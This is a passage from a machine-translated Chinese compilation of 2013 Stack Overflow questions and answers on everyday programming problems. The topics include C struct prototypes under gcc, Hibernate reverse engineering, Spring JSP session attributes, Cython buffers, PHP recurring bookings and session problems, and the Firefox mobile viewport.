} 
```

jsfiddle：http: [//jsfiddle.net/ysLet/](http://jsfiddle.net/ysLet/)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-20T17:05:43.217

[http://jsfiddle.net/ysLet/3/](http://jsfiddle.net/ysLet/3/)

似乎 += 运算符在 css 行中不起作用

```
 $(document).ready(function(){
    deg = 0;
    $('button').click(function(){
        deg += 45;
        $('#cube').css('-webkit-transform','rotateY('+deg+'deg)');
    });
}); 
```

这成功了……

# c - 关于 struct array 作为 gcc 和 vc 编译的参数

> ID：16122877
> 
> 赞同：1
> 
> 时间：2013-04-20T16:58:05.510
> 
> 标签：c, parameters, struct

我知道我可以像这样使用结构数组作为函数参数

创建一个结构

```
struct number{
    int times;
    char numptr;
}numList[MAXNUM]; 
```

并创建一个函数

```
void transform(int i, struct number *L){......} 
```

将结构数组传递给函数

```
transform(i, numList); 
```

但是为什么我可以通过 VC 成功编译它，而不知何故无法通过 gcc 编译它？我使用代码块，它的编译器是 gcc，它的部分错误在这里

```
warning: 'struct number' declared inside parameter list [enabled by default]|
warning: its scope is only this definition or declaration, which is probably not what you want[enabled by default]|
warning: passing argument 2 of 'transform' from incompatible pointer type [enabled by default]|
note: expected 'struct number *' but argument is of type 'struct number *'|
error: conflicting types for 'transform'| 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T17:45:48.477

请注意，问题可能只是订购问题。以下是 SSCCE 的两个示例（[简短、独立、正确的示例](http://sscce.org/)），一个显示您的问题，一个未显示您的问题。两者之间的区别在于函数声明出现在源代码中的位置——在定义之前或之后`struct number`。

### 干净编译

```
#include <stdio.h>

enum { MAXNUM = 3 };

struct number{
    int times;
    char numptr;
}numList[MAXNUM];

void transform(int i, struct number *L);

extern void function(void);

void function(void)
{
    int i = 3;
    transform(3, numList);
    for (int j = 0; j < i; j++)
        printf("%c: %d\n", numList[j].numptr, numList[j].times);
}

$ gcc -O3 -g -std=c99 -Wall -Wextra -Wmissing-prototypes -Wstrict-prototypes -Wold-style-definition -c vc1.c
$ 
```

### 包括警告

```
#include <stdio.h>

void transform(int i, struct number *L);

extern void function(void);

enum { MAXNUM = 3 };

struct number{
    int times;
    char numptr;
}numList[MAXNUM];

void function(void)
{
    int i = 3;
    transform(3, numList);
    for (int j = 0; j < i; j++)
        printf("%c: %d\n", numList[j].numptr, numList[j].times);
} 
```

汇编：

```
$ gcc -O3   -g      -std=c99   -Wall -Wextra -Wmissing-prototypes -Wstrict-prototypes -Wold-style-definition     -c vc2.c
vc2.c:3:30: warning: ‘struct number’ declared inside parameter list [enabled by default]
vc2.c:3:30: warning: its scope is only this definition or declaration, which is probably not what you want [enabled by default]
vc2.c: In function ‘function’:
vc2.c:17:5: warning: passing argument 2 of ‘transform’ from incompatible pointer type [enabled by default]
vc2.c:3:6: note: expected ‘struct number *’ but argument is of type ‘struct number *’
$ 
```

`struct number;`您可以通过在之后`#include`（或者，实际上，在它之前）添加一行来修复第二个示例。或者通过将 的定义`struct number`移到`void transform(int i, struct number *L);`. `transform()`如果您有两个源文件，一个定义函数，一个单独使用它，则更容易遇到此问题。那是您开始使用标头的时候——它们可用于提供不同文件之间的一致性检查。

编译器：Mac OS X 10.7.5 上的 GCC 4.7.1。

# java - 如何使用 Hibernate 逆向工程师扩展超类以拥有通用的 getter/setter

> ID：16122878
> 
> 赞同：1
> 
> 时间：2013-04-20T16:58:05.763
> 
> 标签：java, hibernate

我正在从数据库生成 java 类（使用 Hiberndate 逆向工程）。我生成的所有类都将具有这样的内容（只是为了确保 uid_xxxxx 是数据库表中的主键）：

```
private Integer uidCompany;

@Id
@GeneratedValue(strategy = IDENTITY)
@Column(name = "uid_company", unique = true, nullable = false)
public Integer getUidCompany() {
  return this.uidCompany;
}

public void setUidCompany(Integer uidCompany) {
this.uidCompany = uidCompany;
} 
```

所以我写了这个类：

```
@MappedSuperclass
public abstract class HibernateObject implements Serializable {
   protected Integer uniqueID;

   @Id
   @GeneratedValue(strategy = IDENTITY)
   public Integer getUniqueID() {
   return this.uniqueID;
   }

   public void setUniqueID(Integer aUID) {
   this.uniqueID = aUID;
   }
} 
```

我希望从休眠逆向工程生成的所有类来扩展它。正如您可能猜到的那样，我还希望不创建“uid_xxxxx”属性，而是将值保存到父属性“uniqueID”中。我可以手动完成，但我经常发现自己必须重新生成我的类，这就是为什么我希望逆向工程过程来完成它。

我环顾四周，发现这些链接很有用，但我想我仍然缺少一些东西。任何帮助，将不胜感激！

[http://ocpsoft.org/java/hibernate-use-a-base-class-to-map-common-fields/](http://ocpsoft.org/java/hibernate-use-a-base-class-to-map-common-fields/)

[http://www.myeclipseide.com/documentation/quickstarts/hibernate/](http://www.myeclipseide.com/documentation/quickstarts/hibernate/)

[如何使用 Hibernate/JPA 注释覆盖 GenerationType 策略？](https://stackoverflow.com/questions/328202/how-do-i-override-the-generationtype-strategy-using-hibernate-jpa-annotations)

```
/******************************************EDIT******************************/ 
```

所以这就是我在阅读你的建议后得到的结果：

好的，所以我按照您的指示进行操作，结果如下：

```
public abstract class HibernateObject implements Serializable {
public abstract Integer getUniqueID();  
public abstract void setUniqueID(Integer aUID);
} 
```

和

```
public class MyReverseEngineeringStrategy extends DelegatingReverseEngineeringStrategy {
public MyReverseEngineeringStrategy(ReverseEngineeringStrategy aDelegate) {
super(aDelegate);
}

@Override
public String columnToPropertyName(TableIdentifier table, String column) {
 if(column.startsWith("uid_")) {
  return "uniqueID";
 }
 else {
  return super.columnToPropertyName(table, column);
 }
}

@Override
public Map<String, MetaAttribute> tableToMetaAttributes(TableIdentifier tableIdentifier) {
 @SuppressWarnings("unchecked")
 Map<String, MetaAttribute> metaAttributes = super.tableToMetaAttributes(tableIdentifier);

  if(metaAttributes == null) {
   metaAttributes = new HashMap<String, MetaAttribute>();
  }

  // All generated classes will extend utils.HibernateObject class
  MetaAttribute extendsAttribute = new MetaAttribute("extends");
  extendsAttribute.addValue("utils.HibernateObject");
  metaAttributes.put("extends", extendsAttribute);

  return metaAttributes;
  }
} 
```

现在我所有的hibernate方法都扩展了HibernateObject，并且由于id的参数被命名为“uniqueID”，代码生成器创建的getter和setter覆盖了所需的函数。

我仍然有一个（小）问题：当我使用这样的 HQL 查询语言时： List picklist = session.createQuery("FROM Picklist").list();

我收到这样的错误：“org.hibernate.exception.SQLGrammarException: Unknown column 'picklist0_.uniqueID' in 'field list'”

我知道我收到此错误是因为我的 DataBase 表中没有这样的字段，我认为这是因为 hibernate 尝试从它生成的属性名称中获取字段名称。但是，在 DelegatingReverseEngineeringStrategy 中没有像“PropertyNameToColumn”这样的方法来进行反向名称转换。知道我错过了什么吗？再次感谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-25T05:41:18.890

您可以为逆向工程策略创建一个类，该类扩展任何已定义的策略，如“DelegateRevereseEngineeringStrategy”或“DefaultReverseEngineeringStrategy”。然后，覆盖提供的方法

1.  要排除列，请覆盖以下方法

    ```
    public boolean excludeColumn(TableIdentifier identifier, String columnName) {
      if(columnName.startsWith("uid_")) {
         return true;
      }
      return delegate==null?false:delegate.excludeColumn(identifier, columnName);
    } 
    ```

2.  要从基类扩展生成的类，请使用方法添加元属性

    ```
    public Map<String, MetaAttribute> tableToMetaAttributes(TableIdentifier tableIdentifier) {

      Map<String, MetaAttribute> metaAttributes = super.tableToMetaAttributes(tableIdentifier);

      if(metaAttributes == null) {
        metaAttributes = new HashMap<String, MetaAttribute>();
      }
      // All generated classes will extend com.abc.Test class
      MetaAttribute extendsAttribute = new MetaAttribute("extends");
      extendsAttribute.addValue("com.abc.Test");
      metaAttributes.put("extends", extendsAttribute);
      return metaAttributes;
    } 
    ```

您也可以使用 reveng.xml 文件执行这些操作。有关更多提示，请参阅此[帖子](http://allzhere.in/2013/04/22/hibernate-reverse-engineering-tips/)

# java - 在 Spring MVC 中，跟踪用于所有 jsps 的会话属性的最佳方法是什么？

> ID：16122883
> 
> 赞同：3
> 
> 时间：2013-04-20T16:58:34.397
> 
> 标签：java, spring, spring-mvc, session-variables

我有一个**accountType**变量，它是在用户登录到我的 Web 应用程序时设置的。

在我的许多 jsps 中，我需要检查 accountType 的值，以便相应地显示（或不显示）各种内容。

目前我正在为需要检查accountType的jsp对应的每个模型设置accountType。在 JSP 中，我进行如下检查：

```
<c:if test = "${myModel.accountType == 'B 2 C'}" >
    ... show B 2 C content ...
</c:if> 
```

不幸的是，为每个需要它的模型设置 accountType 非常费力。是否有类似的方法可以在我的 jsps 中读取会话变量，或者在检查会话变量时是否必须使用 scriptlet？

提前致谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-20T17:02:38.983

如果您使用属性名称“accountType”将 accountType 添加到会话，则可以在 JSP 中使用`${accountType}`or 访问它（以避免范围冲突）`${sessionScope.accountType}`。

`${foobar}`在页面中查找名为 foobar 的属性，然后在请求中，然后在会话中，然后在应用程序范围（servlet 上下文）中。

# java - 更新任务模型 - RuntimeException：DataSource 用户为空？

> ID：16122884
> 
> 赞同：2
> 
> 时间：2013-04-20T16:58:39.857
> 
> 标签：java, playframework, playframework-2.1

我今天开始学习 Play 框架，它非常好并且容易学习。

我成功完成了他们[网站](http://www.playframework.com/documentation/2.1.1/JavaTodoList)上提供的示例，但我想对其进行一些修改。

我想看看是否可以更新特定任务的标签，所以我遵循了以下方法

首先，我添加了一条更新数据的路线

```
POST    /tasks/:id/update           controllers.Application.updateTask(id: Long) 
```

然后我将以下代码添加到`index.scala.html`文件中

```
 @form(routes.Application.updateTask(task.id)) {
                    <label class="contactLabel">Update note here:</label> 
 @inputText(taskForm("label")) <br />
                } 
```

然后我将 Application.java 类修改为

```
public static Result updateTask(Long id) {
        Form<Task> taskForm = Form.form(Task.class).bindFromRequest();
        if (taskForm.hasErrors()) {
            return badRequest(views.html.index.render(Task.all(), taskForm));
        } else {
            Task.update(id, taskForm.get());
            return redirect(routes.Application.tasks());
        }
    } 
```

最后在 Task.java 我添加了这段代码

```
public static void update(Long id, Task task) {
        find.ref(id).update(task.label);
    } 
```

但是当我执行更新操作时，我得到了这个错误

> [RuntimeException: DataSource 用户为空？]

不用说我注释掉了

```
 db.default.driver=org.h2.Driver
 db.default.url="jdbc:h2:mem:play"
 ebean.default="models.*" 
```

在 application.conf 中，因为我已经能够保存和删除数据；但是我无法更新数据库中的数据，为什么会发生这种情况，以前有人尝试过这个，我该如何解决这个错误？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-21T01:34:46.107

您`update(Long id, Task task)`在`Task`模型上的方法应如下所示：

```
public static void update(Long id, Task task) {
    task.update(id); // updates this entity, by specifying the entity ID
} 
```

因为您将`task`变量作为更新数据传递，所以您不需要`Task`像在`find.ref(id)`. 此外，类`update()`上的方法`play.db.ebean.Model`（只有一个参数）需要模型的 ID 作为参数。

希望这有助于解决您的问题.. :)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-05-04T18:48:22.943

确保您已在 application.conf 中注释掉 Ebean 配置

```
# Ebean configuration
# ~~~~~
# You can declare as many Ebean servers as you want.
# By convention, the default server is named `default`
#
ebean.default="models.*" 
```

# html - HTML5 语法验证

> ID：16122893
> 
> 赞同：3
> 
> 时间：2013-04-20T16:59:45.110
> 
> 标签：html, w3c-validation

我正在验证一些 HTML，并注意到一些我不熟悉的新错误。这些列表项会根据用户输入使用 JavaScript 填充。

> 元素`li`缺少以下一项或多项属性：`aria-checked`, `aria-expanded`, `aria-valuemax`, `aria-valuemin`, `aria-valuenow`, `aria-valuetext`,`role`

```
<ul id="outTag">
    <li id="item1"></li>
    <li id="item2"></li>
    <li id="item3"></li>
    <li id="item4"></li>
</ul> 
```

如果有人可以对此有所了解，那就太好了。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-20T18:34:21.517

不用担心，这是[此处](http://lists.w3.org/Archives/Public/www-validator-cvs/2013Apr/0038.html)描述的验证器问题。它应该很快修复。

# algorithm - Vertex Biconnected 和 Edge Biconnected 的误解

> ID：16122894
> 
> 赞同：-1
> 
> 时间：2013-04-20T16:59:55.860
> 
> 标签：algorithm, graph

如果没有顶点的删除断开连接图，则连接图是顶点双连接的。如果没有边的移除使图断开连接，则连通图是边双连通的。对下列陈述分别给出证明或反例：

(a) 顶点双连通图是边双连通图。

(b) 边双连通图是顶点双连通的。

对于A）我的尝试是应该是这种情况，因为我看不到删除顶点将如何影响边缘的双向连接。

对于 B）我的尝试是否定的，因为如果我们有一个桥，连接两个图，删除该边将不再使图顶点双连接。

也许我在这里完全错了，任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-20T20:25:02.057

a) 的证明：反证法。令 G = (V,E) 是顶点双连通的。假设它不是边双连接的。然后存在一条边 e = {v,w}，我们可以删除这样 G' = (V, E \ {e}) 是不连通的。但是我们也可以从 G 中删除 v 或 w 并断开图（因为删除边的任一端顶点也会删除该边），这与 G 是顶点双连接的矛盾；因此 G 也必须是边双连通的。

# python - 在 Cython 中使用缓冲区 API

> ID：16122897
> 
> 赞同：21
> 
> 时间：2013-04-20T17:00:09.333
> 
> 标签：python, memory-management, cython, pybuffer, pep3118

我正在使用一个 C 库，该库重复调用用户提供的函数指针以获取更多数据。我想编写一个 Cython 包装器，使得该回调的 Python 实现可以返回任何合理的数据类型，如`str`、`bytearray`、内存映射文件等（特别是支持[Buffer 接口](http://docs.python.org/2/c-api/buffer.html#bufferobjects)）。到目前为止我所拥有的是：

```
from cpython.buffer cimport PyBUF_SIMPLE
from cpython.buffer cimport Py_buffer
from cpython.buffer cimport PyObject_GetBuffer
from cpython.buffer cimport PyBuffer_Release
from libc.string cimport memmove

cdef class _callback:
    cdef public object callback
    cdef public object data

cdef uint16_t GetDataCallback(void * userdata,
                              uint32_t wantlen, unsigned char * data,
                              uint32_t * gotlen):

    cdef Py_buffer gotdata
    box = <_callback> userdata
    gotdata_object = box.callback(box.data, wantlen)
    if not PyObject_CheckBuffer(gotdata_object):
        # sulk
        return 1

    try:
        PyObject_GetBuffer(gotdata_object, &gotdata, PyBUF_SIMPLE)

        if not (0 < gotdata.len <= wantlen):
            # sulk
            return 1

        memmove(data, gotdata.buf, gotdata.len)

        return 0
    finally:
        PyBuffer_Release(&gotdata) 
```

我*想*编写的代码会产生等效的 C 代码，但看起来像这样：

```
from somewhere cimport something
from libc.string cimport memmove

cdef class _callback:
    cdef public object callback
    cdef public object data

cdef uint16_t GetDataCallback(void * userdata,
                              uint32_t wantlen, unsigned char * data,
                              uint32_t * gotlen):

    cdef something gotdata
    box = <_callback> userdata
    gotdata = box.callback(box.data, wantlen)
    if not (0 < gotdata.len <= wantlen):
        # sulk
        return 1

    memmove(data, gotdata.buf, gotdata.len)

    return 0 
```

生成的 C 代码看起来像我认为它应该做的；但这似乎是不必要地在 Python API 中挖掘。Cython 是否提供更好的语法来实现此效果？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-08-13T08:34:47.870

如果您想支持实现新式或旧式缓冲区接口的每个变体的所有内容，那么您必须使用 C API。

但是，如果您不关心旧式缓冲区，您几乎总是可以使用 a [`memoryview`](http://docs.cython.org/src/userguide/memoryviews.html#python-buffer-support)：

> Cython memoryviews 支持几乎所有对象导出 Python 新样式缓冲区的接口。这是 PEP 3118 中描述的缓冲区接口。NumPy 数组支持此接口，Cython 数组也是如此。“几乎所有”是因为 Python 缓冲区接口允许数据数组中的元素本身是指针；Cython 内存视图尚不支持这一点。

这当然包括`str`（或者，在 3.x 中，`bytes`）`bytearray`，等等——如果您点击链接，您可能会注意到它链接到同一页面来解释它支持什么，而您链接到解释您想要支持什么。

对于一维字符数组（如`str`），它是：

```
cdef char [:] gotdata 
```

# jquery - 当用户单击并按住时，jquery重复单击/点击事件

> ID：16122902
> 
> 赞同：1
> 
> 时间：2013-04-20T17:00:46.643
> 
> 标签：jquery, jquery-mobile

我正在使用jquery mobile，但该页面应该也可以在台式机上运行，​​具有完全不同的外观和感觉。因此，根据屏幕大小，我动态加载 jquery 移动框架。这很好用，但现在的问题是，只要按住四个可用按钮之一，我就需要一个图像来保持旋转。在普通台式机上，我可以`mousedown mouseup/mouseout`结合使用 setInterval 来模拟这种行为，但这在触摸设备上不起作用，所以我尝试添加`vmousedown`事件....现在问题是，当 JQM 未加载时，只会`mousedown`触发，但是如果它存在，则事件会为两者触发。

示例代码：

```
$('#test_btn').on(`mousedown vmousedown`,function(e){
    console.log('clicked'); 
}); 
```

我能想到的一种解决方案是检查我是否使用 JQM 并分别为两个事件拥有两个相同代码的副本......但这似乎有点 hacky 解决方案。有更好的选择吗？

# php - 每月重复事件 php mktime

> ID：16122903
> 
> 赞同：1
> 
> 时间：2013-04-20T17:00:48.303
> 
> 标签：php, calendar, repeat, mktime

我有一个预订工具，可以安排重复的活动。我已经能够计算出每天和每周的重复，但由于一个月中的天数不同，我挂断了每月重复。

例如，目标是在每个月的第三个星期四重复预订。我以为我可以通过使用一些简单的数学并以 28 的间隔安排它，但这不起作用。我假设我的代码需要一些额外的变量。

我有一个表格可以传递我的数值，并且就像我提到的每天和每周重复一样。你会看到我通过了 28 作为我的每月值，但会导致问题。它确实在同一天重复，但随着时间的推移在错误的一周内重复。

```
 <input type="radio" class="radio" name="recurring_span" value="1" checked="checked"/><img src='images/icons/calendar-select-days-span.png' alt='daily' title='Daily'>&nbsp;
    <input type="radio" class="radio" name="recurring_span" value="7"><img src='images/icons/calendar-select-days.png' alt='weekly' title='Weekly'/>&nbsp;
    <input type="radio" class="radio" name="recurring_span" value="28"><img src='images/icons/calendar-select-days.png' alt='montly' title='Monthly'/>
    </p> 
```

处理 php 如下（对不起，如果我包含太多，但正如我所说的 PHP 不是很好，认为多比少好）：

```
//store recurring reservation
        if ($recurring_date > $reservation_date){
            $repeatid = querySQL('res_repeat');
            $keys[] = 'repeat_id';
            $values[] = "'".$repeatid."'";
        }

        // UNIX time
        $res_dat = mktime(0,0,0,(int)$m1,(int)$d1,(int)$y1);
        $recurring_date = mktime(0,0,0,(int)$m2,(int)$d2,(int)$y2);
        $recurring_date = ($recurring_date<$res_dat) ? $res_dat : $recurring_date;

        // daily or weekly recurring?
        $recurring_span = ($_POST['recurring_span']) ? $_POST['recurring_span'] : 1;

        //cut both " ' " from reservation_pax
        $res_pax = substr($_SESSION['reservation_pax'], 0, -1);
        $res_pax = substr($_SESSION['reservation_pax'], 1);

        // check if pax not '0'; prevent 'Christof Keller' bug
        if ($res_pax < 1) {
            $res_pax = 1;
        }
        //cut both " ' " from reservation_time
        $startvalue = $_SESSION['reservation_time'];
        $startvalue = substr($startvalue, 0, -1);
        $startvalue = substr($startvalue, 1);

        // do not subtract pax and table when reservation is moved
        //$res_pax = ($_SESSION['outletID'] == $_POST['old_outlet_id']) ? $res_pax : $res_pax*2;
        //$res_tbl = ($_SESSION['outletID'] == $_POST['old_outlet_id']) ? 1 : 2;

    // main loop to store all reservations ( one or recurring)  
     while ( $res_dat <= $recurring_date) {

        // build new reservation date
        $index = '';
        $index = array_search('reservation_date',$keys);
        // build for availability calculation
        $_SESSION['selectedDate'] = date('Y-m-d',$res_dat);
        if($index){
            $values[$index] = "'".$_SESSION['selectedDate']."'";
        }else{
            $keys[] = 'reservation_date';
            $values[] = "'".$_SESSION['selectedDate']."'";
        }
        $index = '';
        $index = array_search('reservation_wait',$keys);
        if($index){
            $values[$index] = '1';
        }       

        //Check Availability
        // =-=-=-=-=-=-=-=-=

        // get Pax by timeslot
        $resbyTime = reservationsByTime('pax');
        $tblbyTime = reservationsByTime('tbl');
        // get availability by timeslot
        $occupancy = getAvailability($resbyTime,$general['timeintervall']);
        $tbl_occupancy = getAvailability($tblbyTime,$general['timeintervall']);               

        $val_capacity = $_SESSION['outlet_max_capacity']-$occupancy[$startvalue];
        $tbl_capacity = $_SESSION['outlet_max_tables']-$tbl_occupancy[$startvalue]; 

        if( $res_pax > $val_capacity || $tbl_capacity  < 1 ){
            //prevent double array entry    
            $index = array_search('reservation_wait',$keys);
            if($index>0){
                if ($values[$index] == '0') {
                  // error on edit entry
                  $_SESSION['errors'][] = date($general['dateformat'],strtotime($_SESSION['selectedDate']))." "._wait_list;
                }               
                  $values[$index] = '1'; // = waitlist
            }else{
                  // error on new entry
                  $keys[] = 'reservation_wait';
                  $values[] = '1'; // = waitlist
                  $_SESSION['errors'][] = date($general['dateformat'],strtotime($_SESSION['selectedDate']))." "._wait_list; 
            }
        }
        // END Availability

        // number of database fields
        $max_keys = count($keys);
        // enter into database
        // -----
        $query = "INSERT INTO `$dbTables->reservations` (".implode(',', $keys).") VALUES (".implode(',', $values).") ON DUPLICATE KEY UPDATE ";
        // Build 'on duplicate' query
        for ($i=1; $i <= $max_keys; $i++) {
            if($keys[$i]!=''){
                $query .= $keys[$i]."=".$values[$i].",";
            }else{
                $max_keys++;
            }
        }
        // run sql query 
        //echo "Query: ".$query;                
        $query = substr($query,0,-1);                  
        $result = query($query);
        $new_id = mysql_insert_id();
        $_SESSION['result'] = $result;

        // setup the right ID
        if( isset($new_id) || $new_id != $_POST['reservation_id']){
            $history_id = $new_id;
        }else{
            $history_id = $_POST['reservation_id'];
        }
        // store changes in history
        $result = query("INSERT INTO `$dbTables->res_history` (reservation_id,author) VALUES ('%d','%s')",$history_id,$_POST['reservation_booker_name']);

        // -----
        // increase reservation date one day or week
        $d1 += $recurring_span;
        $res_dat = mktime(0,0,0,$m1,$d1,$y1);

     } // end while: reservation to store 
```

我不应该我对 PHP 不太了解并尝试学习，我的经验仅限于处理现有代码的绊脚石。对于这个项目，我一直在努力定制和修改一个开源调度工具以满足我的需要。研究mktime没有太大进展。提前致谢！

# php - 本地主机上完美的 PHP 程序，无法在实时站点上运行

> ID：16122906
> 
> 赞同：1
> 
> 时间：2013-04-20T17:00:55.943
> 
> 标签：php, localhost

以下实际上是我的 php 类的作业。我在我的本地主机上解决了这个问题。一切都在那里运行完美，但是当我将其上传到我的实时站点时，逻辑变得一团糟。这是典型的“猜谜游戏”程序。没有报告错误。

唯一的问题是，*在实时服务器上*，用户可以输入**任何内容** ——甚至是“1”，这表明他们的输入“太高了”。

这可能是我网站的（fatcow）php 设置的问题吗？我认为正在发生的事情不知何故将我的会话变量显示为“零”，而不是 rand(1, 10) 数字。为什么会发生这种情况？如何修复它以使其与在本地主机上的工作方式相同？

编码：

```
<?php

session_start();

error_reporting (E_ALL | E_STRICT);

$pageTitle = "Guessing Game";
include('includes/header.inc.php');

if (isset($_POST['finish']))
{
        unset($_SESSION);
        $_SESSION = array();
        session_destroy();
        die ('<h2>Congratulations</h2>
              <p>Your session has been reset.<br />
              Click <a href="guessingGame.php">HERE</a> to play again!</p>');
}
elseif (isset($_POST['guess']))
{
    $_SESSION['count'] = $_SESSION['count'] + 1;
    $guess = $_POST['guess'];
    if (!ctype_digit($guess) || $guess <= 0 || $guess > 10 )
    {
        echo'<p span class="italic">SORRY, that entry is invalid</span></p>';
    }
    else 
    {
        if ($guess == $_SESSION['num'])
        {
            die ('<h1>Hooray!</h1>
            <h2>You got it correct<br />
                And it only took you ' . $_SESSION['count'] . ' tries!</h2>
            <p>Click the button to finish:</p>
                <form action="guessingGame.php" method="post">
                  <input type="submit" name="submit" value="Finished" />
                  <input type="hidden" name="finish" value="true" />
                </form></p>');
        }
        elseif ($guess < $_SESSION['num']) 
        {
            echo '<h2>Sorry, that is incorrect.</h2>
                <p>Your guess is too LOW</p>';
        }
        else 
        {
            echo '<h2>Sorry, that is incorrect.</h2>
                <p>Your guess is too HIGH</p>';
        }               
    }
}
else
{
    $_SESSION['num'] = rand(1,10);
    $_SESSION['count'] = 0;
}
?>      
<h1>Please guess a number between 1 and 10</h1>
<p>
    <form method="post" action="<?php echo $_SERVER['PHP_SELF']; ?>" >
        <input type="text" name="guess" size="2" />
        <input type="submit" name="submit" value="Submit" />
    </form>
</p>
<?php
include('includes/footer.inc.php');
?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-20T21:12:41.787

（我将添加我的评论作为答案，因为它有助于解决问题。）

显然，Fat Cow 托管无法开箱即用地进行会话。一些链接可以看到：

*   [http://theedgeofall.com/journeys/2010/04/21/php-ini-issues-fat-cow-hosting/](http://theedgeofall.com/journeys/2010/04/21/php-ini-issues-fat-cow-hosting/)
*   [http://www.fatcow.com/knowledgebase/beta/article.bml?ArticleID=1290](http://www.fatcow.com/knowledgebase/beta/article.bml?ArticleID=1290)
*   [http://www.fatcow.com/knowledgebase/read_article.bml?kbid=7090](http://www.fatcow.com/knowledgebase/read_article.bml?kbid=7090)

B. 布尔佩特。我建议您尝试找到**不**使用[寄存器全局变量](http://php.net/manual/en/security.globals.php)的解决方案，因为它已被弃用，将从 PHP 5.4.0 开始删除。

# django - 在 django 模型中实现结构化属性

> ID：16122907
> 
> 赞同：1
> 
> 时间：2013-04-20T17:01:11.603
> 
> 标签：django, google-app-engine, django-models, django-nonrel

Google appengine 有一个名为 Structured Properties 的模型字段，它可以将模型列表存储在模型中的另一个模型中。在这里看到它：

[https://developers.google.com/appengine/docs/python/ndb/properties#structured](https://developers.google.com/appengine/docs/python/ndb/properties#structured)

在 django 中实现这一点的方法是什么？更具体地说是 django-nonrel。

我目前正在尝试使用 ListField 执行此操作。

```
class ModelA(models.Model):
    name = model.CharField(max_length=10)

class ModelB(models.Model):
    alist = fields.ListField(models.ForeignKey(ModelA)) 
```

有更好的方法吗？

# android - 移动 Firefox 完全忽略视口

> ID：16122910
> 
> 赞同：9
> 
> 时间：2013-04-20T17:01:30.993
> 
> 标签：android, firefox, mobile, scale, viewport

我迷路了，不知道如何说服 Mobile-Firefox 加载我的网站完全缩小：/我找不到搜索 stackoverflow 和 web 的有效解决方案。这是一个链接

[网站](http://www.toxic-twin.de/schegk2/)！

我的网站没有单独的移动版本。我允许在 iPhone、iPad 和现有的 Android 浏览器上放大和缩小，它可以完美运行。但是在我的 Android 上使用 Mobile-Firefox 时，它会加载页面并对其进行缩放……而这本身并不是主要问题！

页面的“可点击”区域仍然是初始缩放的小“框”：我不能滑动我的滑块，我什至不能点击那个小“活动框”之外的图片来打开fancybox-links之类的。一旦我将我的网站平移到那个小“盒子”中，我就可以滑动、单击链接并尽可能地进行交互。

我的元代码如下：

```
 <meta name="viewport" content="width=device-width, initial-scale=1"> 
```

我使用[html5boilerplate](http://html5boilerplate.com/)作为我网站的起点，您是否看到任何可能与我的视口问题造成的冲突？另一个用户似乎找到了解决方案，摆脱了另一个指向旧浏览器的元标记。我在我的代码中找到了以下内容，但我是否删除它并不重要：

```
 <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"> 
```

我还尝试使用以下代码片段，但无济于事：

```
 <style>
    -moz-@viewport {
            width: device-width;
            initial-scale: 1;
    }   
    </style> 
```

也许有人知道一个简单的解决方案？对于如何解决问题的任何帮助、建议或提示，我将不胜感激:) 非常感谢您！

干杯，梅林。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-21T09:01:06.843

## 将视口设置`width`为移动设备所需的宽度：

```
 <meta name="viewport" content="width=640"> 
```

`width=device-width`强制浏览器在*Android上使用***360px**，在*iPhone上使用***320px**。

 ***** * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-10-25T20:26:53.543

显然，如果您单独设置宽度标签而不设置其他标签，它就可以工作。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-12-27T16:04:00.813

我做了很多工作，在我检查了其他在 firefox mobile 上工作的网站后，我找到了解决方案。解决方案是增加元标记视口：

这在这里工作得很好。

```
<meta name = "viewport" content = "width = device-width, initial-scale = 1, minimum-scale = 1, maximum-scale = 1, user-scalable = no">
```****

# php - 高效地重新加载数据/将数据从服务器推送到客户端

> ID：16122911
> 
> 赞同：8
> 
> 时间：2013-04-20T17:01:48.097
> 
> 标签：php, javascript, stream, client-server, comet

在将数据从 Web 服务器重新加载到前端时，我正在寻找“可行的方法”（即最有效、最常用、普遍接受的方式）。在最终应用程序中，我将有几个必须写入数据的输出字段，例如：

![在此处输入图像描述](https://i.stack.imgur.com/52flL.png)

最终应用程序中的数据流将彼此*不同*。必须使用来自服务器的最新数据重新加载这些行。

我一直在考虑使用 Ajax 请求像每秒一样更新，但必须有另一种方法来做到这一点。Ajax 请求会造成大量的数据流量。此外，使用 Facebook 聊天时，您不必每秒钟都等待，聊天几乎是立即收到的。然而，当我使用 Mozilla Firefox 的开发人员工具时，我没有看到任何 Ajax 轮询请求。这让我想到是否会有不同的方法来做到这一点。

我已经研究过 Node.js，但我的主机似乎无法做到这一点。

我听说有人在谈论 Ajax Push，我应该使用它吗？如果是这样，你能给我一个基本的用法示例吗？

如果不是，*那么*当有多个数据流必须在一秒钟内重新加载时，该怎么办？

要求是*速度*和*低数据流量*。因此，我认为，连续轮询服务器不是一种选择，因为这会产生巨大的开销。

^(我认为这并不重要，但我在后端使用 PHP5.3，在前端使用带有 jQ​​uery 1.9.1 的 JavaScript。)

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-04-23T14:20:06.817

这个问题已经被问过很多次了，但方式略有不同。以下是一些值得一读的参考资料：

*   [什么是长轮询、Websocket、服务器发送事件 (SSE) 和 Comet？](https://stackoverflow.com/questions/11077857/what-are-long-polling-websockets-server-sent-events-sse-and-comet)
*   [在 PHP 中使用彗星？](https://stackoverflow.com/questions/603201/using-comet-with-php)
*   [支持彗星的 Apache](https://stackoverflow.com/questions/7684279/apache-with-comet-support)
*   [服务器可扩展性 - HTML 5 websockets vs Comet](https://stackoverflow.com/questions/9107384/server-scalability-html-5-websockets-vs-comet)
*   [如何在 PHP 中实现事件监听](https://stackoverflow.com/questions/7469396/how-to-implement-event-listening-in-php)

